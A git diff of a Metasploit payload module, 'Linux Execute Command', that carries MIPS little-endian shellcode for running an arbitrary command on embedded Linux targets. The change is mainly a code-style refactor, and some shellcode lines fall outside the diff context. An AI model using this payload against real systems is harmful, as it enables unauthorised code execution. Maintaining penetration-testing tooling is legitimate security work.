@@ -1,47 +1,46 @@
+# -*- coding: binary -*-
+
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 module MetasploitModule
-
   CachedSize = 52
 
   include Msf::Payload::Single
-  include Msf::Payload::Linux
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Execute Command',
-      'Description'   => %q{
-        A very small shellcode for executing commands.
-        This module is sometimes helpful for testing purposes as well as
-        on targets with extremely limited buffer space.
-         },
-      'Author'        =>
-        [
-          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload
-          'entropy@phiral.net'  #original payload
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Execute Command',
+        'Description' => %q{
+          A very small shellcode for executing commands.
+          This module is sometimes helpful for testing purposes as well as
+          on targets with extremely limited buffer space.
+        },
+        'Author' => [
+          'Michael Messner <devnull[at]s3cur1ty.de>', # metasploit payload
+          'entropy@phiral.net' # original payload
         ],
-      'References'    =>
-        [
+        'References' => [
           ['EDB', '17940']
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSLE,
-      'Payload'       =>
-        {
-          'Offsets' => {} ,
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_MIPSLE,
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
-        })
+        }
+      )
     )
     register_options(
       [
-        OptString.new('CMD', [ true, "The command string to execute" ]),
-      ], self.class)
+        OptString.new('CMD', [ true, 'The command string to execute' ]),
+      ]
+    )
   end
 
   #
@@ -51,8 +50,7 @@ module MetasploitModule
     return datastore['CMD'] || ''
   end
 
-  def generate
-
+  def generate(_opts = {})
     shellcode =
       "\x66\x06\x06\x24" + # li a2,1638
       "\xff\xff\xd0\x04" + # bltzal a2,4100b4
@@ -73,10 +71,8 @@ module MetasploitModule
     shellcode = shellcode + command_string + "\x00"
 
     # we need to align our shellcode to 4 bytes
-    (shellcode = shellcode + "\x00") while shellcode.length%4 != 0
+    shellcode += "\x00" while shellcode.bytesize % 4 != 0
 
     return super + shellcode
-
   end
-
 end
